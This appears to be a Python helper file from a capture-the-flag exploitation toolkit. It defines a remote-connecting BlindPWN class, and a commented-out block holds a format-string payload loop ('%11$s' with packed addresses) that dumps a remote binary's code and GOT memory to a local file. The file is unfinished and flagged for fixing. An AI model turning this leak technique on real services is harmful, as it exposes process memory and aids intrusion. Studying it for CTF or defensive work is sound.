# -*- coding:utf-8 -*-

from PWN import *
from ..misc.Log import Log
class BlindPWN(PWN):
    """ just connect to remote(2333 """
    def __init__(self,remote_ip,remote_port):
        context.log_level='debug'
        Log.s("don't forget to se context.arch")
        self.run(remote_ip,remote_port)
    
"""
should be fixed!
some address(perhaps):
    0x400000 code
    0x601000 got 
    0x8048000 code 
    0x804A000 got

def get(payload):
    r.sendlineafter("Please tell me:",payload)
    r.recvuntil("Repeater:")
    return r.recvline()[:-1]

def dump(start=0x400000,length=0x1000,fmt_leak_function=get):
    res=''
    i=0
    while i<length:
        info(i)
        payload='a'*8+("%"+str(11)+"$s").ljust(0x10,'\x00')
        payload+=p64(start+i)
        tmp=fmt_leak_function(payload)
        if len(tmp)==8:
            res+='\x00'
            i+=1
        else:
            res+=tmp[8:]
            i+=len(tmp)
        print(repr(res))

    f=open("./dump_code","a+")
    f.write(res)
    f.close()
"""